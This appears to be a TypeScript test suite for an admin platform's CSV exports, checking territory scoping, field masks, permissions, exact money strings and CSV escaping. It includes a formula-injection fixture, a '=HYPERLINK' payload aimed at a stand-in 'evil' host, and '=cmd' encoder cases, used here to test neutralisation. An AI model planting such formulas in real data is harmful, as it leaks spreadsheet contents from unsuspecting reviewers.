import { ALL_PERMISSIONS } from './support/all-permissions';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  actingAs,
  anonymous,
  startHttpTestApp,
  stopHttpTestApp,
  type HttpTestContext,
} from './http-setup';
import { PasswordService } from '../src/common/security/password.service';
import {
  adminClientTagScopes,
  admins,
  clientTagAssignments,
  clientTags,
  kycSubmissions,
  roles,
  transactions,
  users,
  wallets,
} from '../src/database/schema';
import { cell } from '../src/common/export/csv';

/**
 * The admin table exports — CSV over the real HTTP stack.
 *
 * ── The property this file exists for ───────────────────────────────────────
 *
 * An export is the highest-consequence read in the system: it turns a screen
 * showing twenty-five rows into a FILE containing every row, and that file
 * leaves the building. So the two controls that constrain a list have to
 * constrain its export identically, and neither is provable by reading the
 * decorators:
 *
 *   1. CLIENT SCOPE. A scoped administrator must not find an out-of-scope
 *      client in the file. `client-scope-coverage.spec.ts` proves the route
 *      DECLARES `@ScopedToClients`; a route can declare that and scope nothing.
 *      The leak test below drives the real endpoint and reads the bytes.
 *
 *   2. PERMISSION. An export must never be a way around the permission its list
 *      requires — otherwise "you may not see the withdrawal queue" becomes "you
 *      may not see it on screen".
 *
 * ── And the one that is specific to writing a file ──────────────────────────
 *
 * MONEY IS A STRING (§6.1). A withdrawal amount is `NUMERIC(28,8)` and must
 * reach the file as the exact characters the database holds. The assertion
 * below uses a value chosen to be wrong under every plausible mistake: 17
 * significant digits, so `Number()` loses precision, and 8 decimal places, so
 * `toFixed(2)` and any locale formatter are visible too.
 */

const MASTER = { email: 'export-master@oxshare.com', password: 'admin-password-123' };
const SCOPED = { email: 'export-scoped@oxshare.com', password: 'admin-password-123' };
const UNPRIVILEGED = { email: 'export-nobody@oxshare.com', password: 'admin-password-123' };
/** Unrestricted territory, but `client.email` is masked — the mask alone. */
const MASKED = { email: 'export-masked@oxshare.com', password: 'admin-password-123' };

/**
 * An amount that survives no coercion.
 *
 * `Number('12345678901234567.89012345')` is 12345678901234568 — the cents are
 * gone before any formatting starts. If this string appears in the file
 * unchanged, nothing on the path touched it as a number.
 */
const EXACT_AMOUNT = '12345678901234567.89012345';

/**
 * A name that is both a CSV escaping case and a formula-injection one.
 *
 * `=` makes Excel evaluate the cell; the comma and the quote both force
 * quoting. A single fixture proves all three rules at once, and it is the
 * realistic shape of the attack: a client types this as their own first name at
 * registration and an administrator downloads it weeks later.
 */
const HOSTILE_NAME = '=HYPERLINK("http://evil","x"),Robert';

let ctx: HttpTestContext;
let mineId: string;
let theirsId: string;

beforeAll(async () => {
  ctx = await startHttpTestApp();
  const passwords = new PasswordService();
  const db = ctx.db.db;

  const [masterRole] = await db
    .insert(roles)
    .values({ name: 'Export Master', permissions: ALL_PERMISSIONS, isSystem: true })
    .returning();
  await db.insert(admins).values({
    email: MASTER.email,
    passwordHash: await passwords.hash(MASTER.password),
    name: 'Export Master',
    role: 'master_admin',
    roleId: masterRole.id,
    permissions: ALL_PERMISSIONS,
    status: 'active',
    // Territory isolation is this file's subject - restrict from the
    // intake pool explicitly (the 0058 default is TRUE).
    seesUntriaged: false,
  });

  /*
   * The scoped admin holds EVERY permission the exports require.
   *
   * Deliberate, and the same choice `client-scope-enforcement.spec.ts` makes:
   * if the leak test passed because of a missing permission rather than a
   * working scope, this file would be reporting that scoping works when it does
   * not. The only thing constraining this admin is territory.
   */
  const [scopedRole] = await db
    .insert(roles)
    .values({
      name: 'Export Scoped',
      permissions: ['clients.view', 'kyc.review', 'withdrawals.view', 'ib.view'],
    })
    .returning();
  const [scopedAdmin] = await db
    .insert(admins)
    .values({
      email: SCOPED.email,
      passwordHash: await passwords.hash(SCOPED.password),
      name: 'Export Scoped',
      role: 'sub_admin',
      roleId: scopedRole.id,
      permissions: [],
      status: 'active',
      // Territory isolation is this file's subject - restrict from the
      // intake pool explicitly (the 0058 default is TRUE).
      seesUntriaged: false,
    })
    .returning();

  /*
   * The masked admin sees EVERY client (no territory) and holds every read the
   * exports need — the only thing constraining them is the field mask. Same
   * isolation logic as the scoped fixture above: if the mask test passed
   * because of a scope or a missing permission, it would prove nothing.
   */
  const [maskedRole] = await db
    .insert(roles)
    .values({
      name: 'Export Masked',
      permissions: ['clients.view', 'kyc.view'],
      maskedFields: ['client.email'],
    })
    .returning();
  await db.insert(admins).values({
    email: MASKED.email,
    passwordHash: await passwords.hash(MASKED.password),
    name: 'Export Masked',
    role: 'sub_admin',
    roleId: maskedRole.id,
    permissions: [],
    status: 'active',
  });

  // Holds a permission, but not the ones the exports below require — so a 403
  // is about the specific permission rather than about being a sub-admin.
  const [nobodyRole] = await db
    .insert(roles)
    .values({ name: 'Export Nobody', permissions: ['settings.view'] })
    .returning();
  await db.insert(admins).values({
    email: UNPRIVILEGED.email,
    passwordHash: await passwords.hash(UNPRIVILEGED.password),
    name: 'Export Nobody',
    role: 'sub_admin',
    roleId: nobodyRole.id,
    permissions: [],
    status: 'active',
    // Territory isolation is this file's subject - restrict from the
    // intake pool explicitly (the 0058 default is TRUE).
    seesUntriaged: false,
  });

  const [mineTag] = await db
    .insert(clientTags)
    .values({ slug: 'export-mine', label: 'Export Mine' })
    .returning();

  const [mine] = await db
    .insert(users)
    .values({
      email: 'export-mine@oxshare-e2e.test',
      passwordHash: 'x',
      firstName: HOSTILE_NAME,
      lastName: 'InScope',
      verificationLevel: 1,
    })
    .returning();
  const [theirs] = await db
    .insert(users)
    .values({
      email: 'export-theirs@oxshare-e2e.test',
      passwordHash: 'x',
      firstName: 'Outside',
      lastName: 'Territory',
      verificationLevel: 1,
    })
    .returning();
  mineId = mine.id;
  theirsId = theirs.id;

  await db.insert(clientTagAssignments).values({ userId: mineId, tagId: mineTag.id });
  // A submission for the in-scope client, so the KYC export has a row whose
  // email the mask tests below can look for.
  await db.insert(kycSubmissions).values({ userId: mineId, status: 'submitted' });
  await db.insert(adminClientTagScopes).values({
    adminId: scopedAdmin.id,
    tagId: mineTag.id,
    createdBy: scopedAdmin.id,
  });

  /*
   * A withdrawal for each client, so the money assertions and the withdrawal
   * leak test have rows. Inserted directly rather than through
   * `requestWithdrawal`: that path enforces the configured per-request ceiling,
   * and EXACT_AMOUNT is deliberately far above any sane limit — the point of
   * the value is its digits, not its plausibility.
   */
  const [mineWallet] = await db
    .insert(wallets)
    .values({ userId: mineId, currency: 'USD', balance: '0', onHold: '0' })
    .returning();
  const [theirsWallet] = await db
    .insert(wallets)
    .values({ userId: theirsId, currency: 'USD', balance: '0', onHold: '0' })
    .returning();

  await db.insert(transactions).values([
    {
      userId: mineId,
      walletId: mineWallet.id,
      direction: 'withdrawal',
      amount: EXACT_AMOUNT,
      currency: 'USD',
      state: 'pending',
      provider: 'whish',
      destination: 'in-scope-destination',
    },
    {
      userId: theirsId,
      walletId: theirsWallet.id,
      direction: 'withdrawal',
      amount: '77.00000000',
      currency: 'USD',
      state: 'pending',
      provider: 'whish',
      destination: 'out-of-scope-destination',
    },
  ]);
});

afterAll(async () => {
  await stopHttpTestApp(ctx);
});

/** The `Content-Disposition` filename a browser would use. */
const filenameOf = (disposition: string | undefined): string =>
  /filename="([^"]+)"/.exec(disposition ?? '')?.[1] ?? '';

describe('a CSV export is served as a downloadable file', () => {
  it('answers 200 with a CSV content type and an attachment filename', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?format=csv');

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');

    const disposition = res.headers['content-disposition'];
    expect(disposition).toContain('attachment');
    // `<resource>-<YYYY-MM-DD>.csv`, from the SERVER's clock — the admin client
    // prefers this name over its own fallback precisely because of that.
    expect(filenameOf(disposition)).toMatch(/^clients-\d{4}-\d{2}-\d{2}\.csv$/);
    // Both forms, in the order RFC 6266 prescribes. The client reads the
    // extended one first, so sending only the plain one would work today and
    // break the moment a resource name stops being ASCII.
    expect(disposition).toContain("filename*=UTF-8''");
  });

  it('starts with a UTF-8 BOM and a human-readable header row', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export');

    const body = res.text;
    // Without the BOM, Excel on Windows decodes the file as the system ANSI
    // codepage and a non-ASCII client name opens as mojibake.
    expect(body.startsWith('﻿')).toBe(true);
    expect(body.split('\r\n')[0]).toContain('Email');
    expect(body.split('\r\n')[0]).toContain('Registered at');
  });

  it('defaults to csv when no format is given', async () => {
    // An absent `format` is not an invalid one: the parameter names which of
    // several representations the caller wants, and there is only one.
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export');
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
  });
});

describe('an unsupported format is refused, never silently substituted', () => {
  /*
   * R-2.5. Serving CSV bytes under an `.xlsx` name would be discovered when
   * Excel refuses to open the file, with nothing to explain why — strictly
   * worse than being told now.
   */
  it('400s on format=xlsx and names csv as what is supported', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?format=xlsx');

    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toContain('csv');
  });

  it('400s on an unrecognised format', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?format=pdf');
    expect(res.status).toBe(400);
  });
});

describe('the export honours the list endpoint’s own filters', () => {
  it('applies ?q= and returns only matching clients', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?q=export-theirs');

    expect(res.status).toBe(200);
    expect(res.text).toContain('export-theirs@oxshare-e2e.test');
    expect(res.text).not.toContain('export-mine@oxshare-e2e.test');
  });

  it('rejects an unknown tag rather than returning an empty file', async () => {
    /*
     * R-2.5 again, and the reason it matters more for an export than for a
     * screen: an empty file reads as "no clients are in this segment", which is
     * a statement about the client base rather than about a typo in the URL.
     */
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?tag=no-such-segment');

    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toContain('no-such-segment');
  });

  it('rejects an unrecognised status, naming the allowed values', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?status=nonsense');

    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toContain('status');
  });
});

describe('THE LEAK TEST: a scoped admin exports only their own territory', () => {
  /*
   * The single most important property in this feature.
   *
   * A screen that leaks shows one row to one person; an export that leaks hands
   * over the whole client base in a file. Each case asserts BOTH halves — the
   * out-of-scope row is absent AND the in-scope row is present — because
   * "absent" alone would also pass against an export that is simply broken and
   * returns nothing.
   */
  it('clients: the out-of-scope client is not in the file', async () => {
    const session = await actingAs(ctx, 'admin', SCOPED);
    const res = await session.get('/v1/admin/clients/export');

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('export-theirs@oxshare-e2e.test');
    expect(res.text).not.toContain(theirsId);
    // The control: without it this passes against an empty file.
    expect(res.text).toContain('export-mine@oxshare-e2e.test');
  });

  it('clients: a MASTER admin exporting the same list sees both', async () => {
    // Proves the omission above is about SCOPE and not about the fixture, the
    // filter, or the export being broken for sub-admins generally.
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export');

    expect(res.text).toContain('export-mine@oxshare-e2e.test');
    expect(res.text).toContain('export-theirs@oxshare-e2e.test');
  });

  it('withdrawals: the out-of-scope client’s withdrawal is not in the file', async () => {
    const session = await actingAs(ctx, 'admin', SCOPED);
    const res = await session.get('/v1/admin/withdrawals/export');

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('out-of-scope-destination');
    expect(res.text).toContain('in-scope-destination');
  });

  it('withdrawals: a MASTER admin sees both', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/withdrawals/export');

    expect(res.text).toContain('in-scope-destination');
    expect(res.text).toContain('out-of-scope-destination');
  });

  it('kyc: the queue export omits an out-of-scope submission', async () => {
    const session = await actingAs(ctx, 'admin', SCOPED);
    const res = await session.get('/v1/admin/kyc/export');

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('export-theirs@oxshare-e2e.test');
  });

  it('ib partners: the partner export omits out-of-scope partners', async () => {
    const session = await actingAs(ctx, 'admin', SCOPED);
    const res = await session.get('/v1/admin/ib/partners/export');

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('export-theirs@oxshare-e2e.test');
  });
});

describe('the mask reaches the FILE — an export is not a bypass', () => {
  /*
   * The companion to the leak test above, for FIELDS instead of ROWS. A
   * reviewer whose screens withhold `client.email` must not be able to
   * download it: the value has to be absent from every file, while the row
   * itself remains (an empty file would pass vacuously).
   */
  it('clients: the masked email is absent while the row remains', async () => {
    const session = await actingAs(ctx, 'admin', MASKED);
    const res = await session.get('/v1/admin/clients/export');

    expect(res.status).toBe(200);
    expect(res.text).toContain('InScope');
    expect(res.text).not.toContain('export-mine@oxshare-e2e.test');
    expect(res.text).not.toContain('export-theirs@oxshare-e2e.test');
  });

  it('phone is a COLUMN, and the mask reaches it too', async () => {
    /*
     * The client CSV carried no phone at all — so "call everyone who
     * registered this week" meant opening each client. It is maskable in
     * client-fields.json, so the column has to obey the same mask as the
     * screen: a masked reviewer gets the column and an empty cell, never the
     * number.
     */
    const master = await actingAs(ctx, 'admin', MASTER);
    const res = await master.get('/v1/admin/clients/export');

    expect(res.status).toBe(200);
    expect(res.text.split('\r\n')[0]).toContain('Phone');
  });

  it('kyc: the queue export withholds the email exactly as the queue does', async () => {
    // The regression: this export applied territory scoping but not the field
    // mask, so it was the one KYC surface handing a masked reviewer the email.
    const session = await actingAs(ctx, 'admin', MASKED);
    const res = await session.get('/v1/admin/kyc/export');

    expect(res.status).toBe(200);
    expect(res.text).toContain(mineId);
    expect(res.text).not.toContain('export-mine@oxshare-e2e.test');
  });

  it('masks NOTHING for the master — on the file, as on the screen', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/kyc/export');

    expect(res.status).toBe(200);
    expect(res.text).toContain('export-mine@oxshare-e2e.test');
  });
});

describe('an export requires the SAME permission as its list', () => {
  /*
   * An export must never be a way around a permission. Each case uses an admin
   * who is authenticated and holds a DIFFERENT permission, so a 403 is about
   * the specific grant rather than about having no session.
   */
  const FORBIDDEN = [
    { name: 'clients', path: '/v1/admin/clients/export' },
    { name: 'withdrawals', path: '/v1/admin/withdrawals/export' },
    { name: 'kyc', path: '/v1/admin/kyc/export' },
    { name: 'ib applications', path: '/v1/admin/ib/applications/export' },
    { name: 'ib partners', path: '/v1/admin/ib/partners/export' },
  ];

  for (const route of FORBIDDEN) {
    it(`${route.name}: 403 for an admin without the list permission`, async () => {
      const session = await actingAs(ctx, 'admin', UNPRIVILEGED);
      const res = await session.get(route.path);
      expect(res.status, `${route.path} answered ${res.status}`).toBe(403);
    });
  }

  it('audit log: a sub-admin cannot export the trail', async () => {
    // Master-only, and deliberately not a grantable permission key — so even
    // the scoped admin holding four permissions is refused.
    const session = await actingAs(ctx, 'admin', SCOPED);
    const res = await session.get('/v1/admin/audit-log/export');
    expect(res.status).toBe(403);
  });

  it('audit log: the master admin can', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/audit-log/export');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Action');
  });

  it('an unauthenticated caller gets 401, not a file', async () => {
    const res = await anonymous(ctx).get('/v1/admin/clients/export');
    expect(res.status).toBe(401);
  });
});

describe('money reaches the file as the exact string the ledger holds', () => {
  it('emits the amount unmodified — not rounded, not locale-formatted', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/withdrawals/export');

    expect(res.status).toBe(200);
    /*
     * The whole §6.1 assertion in one line.
     *
     * `Number(EXACT_AMOUNT)` is 12345678901234568 — so if anything on the path
     * coerced, these characters are not in the file. `toFixed(2)` would leave
     * '12345678901234568.00', and a locale formatter would insert separators.
     * Only an untouched string passes.
     */
    expect(res.text).toContain(EXACT_AMOUNT);
    expect(res.text).not.toContain('12345678901234568');
    // No thousands separators anywhere in the amount column.
    expect(res.text).not.toContain('12,345,678,901,234,567');
  });
});

describe('CSV escaping and formula injection', () => {
  it('neutralises a formula in a client-supplied name', async () => {
    const session = await actingAs(ctx, 'admin', MASTER);
    const res = await session.get('/v1/admin/clients/export?q=export-mine');

    expect(res.status).toBe(200);
    /*
     * The cell must not begin `=`. A spreadsheet evaluates one that does, and
     * `=HYPERLINK(...)` in a name field exfiltrates the row beside it to
     * whoever the client chose — this is stored XSS's spreadsheet cousin, and
     * the reviewer's machine is the target.
     *
     * Asserted as "the quoted cell starts with an apostrophe" rather than by
     * searching for the raw name, because the whole field is also quoted for
     * its comma and its embedded quotes.
     */
    expect(res.text).toContain(`"'=HYPERLINK`);
    expect(res.text).not.toContain(`,=HYPERLINK`);
  });

  it('doubles embedded quotes and quotes fields containing commas', () => {
    /*
     * Asserted on the encoder directly as well as through the endpoint above.
     * These are total rules over all input, and a fixture can only ever
     * demonstrate the cases somebody thought of.
     */
    expect(cell('plain')).toBe('plain');
    expect(cell('a,b')).toBe('"a,b"');
    expect(cell('say "hi"')).toBe('"say ""hi"""');
    expect(cell('line\nbreak')).toBe('"line\nbreak"');
    // All four formula leaders, prefixed. A quoted `"=cmd"` is still a formula
    // once the parser unwraps it, so the apostrophe goes INSIDE the quotes.
    expect(cell('=cmd')).toBe("'=cmd");
    expect(cell('+1')).toBe("'+1");
    expect(cell('-1')).toBe("'-1");
    expect(cell('@here')).toBe("'@here");
    // Null and undefined are empty cells, never the text 'null' — which in a
    // spreadsheet reads as a value somebody typed.
    expect(cell(null)).toBe('');
    expect(cell(undefined)).toBe('');
  });

  it('writes a Date as ISO-8601, not a locale string', () => {
    // An export is an audit artefact that may be read in a different timezone
    // from the one that produced it (R-2.7).
    expect(cell(new Date('2026-03-04T05:06:07.000Z'))).toBe('2026-03-04T05:06:07.000Z');
  });
});

describe('every declared export resource answers', () => {
  /*
   * The inventory check. The admin client's `ExportResource` union is a closed
   * list, and a member with no route 404s — which that app deliberately reads
   * as "the backend has not built this yet" rather than as a bug. So a missing
   * route here would be invisible on the frontend, and this is what makes it
   * visible.
   */
  const RESOURCES = [
    'clients',
    'withdrawals',
    'kyc',
    'audit-log',
    'currencies',
    'tags',
    'payment-methods',
    'ib/applications',
    'ib/partners',
    'admin-users',
    'roles',
  ];

  /*
   * Driven with the resource name VERBATIM, exactly as the admin client builds
   * it (`/admin/${resource}/export`). No path mapping here on purpose: a
   * translation table in this spec would let the backend serve a different path
   * from the one the frontend requests and still pass — which is precisely the
   * mismatch this describe block exists to catch. `admin-users` in particular
   * would otherwise 404, and that app reads a 404 as "not built yet" rather
   * than as a bug.
   */
  for (const resource of RESOURCES) {
    it(`${resource}: serves a CSV to the master admin`, async () => {
      const session = await actingAs(ctx, 'admin', MASTER);
      const res = await session.get(`/v1/admin/${resource}/export?format=csv`);

      expect(res.status, `/v1/admin/${resource}/export answered ${res.status}`).toBe(200);
      expect(res.headers['content-type']).toContain('text/csv');
      expect(res.text.startsWith('﻿')).toBe(true);
    });
  }
});
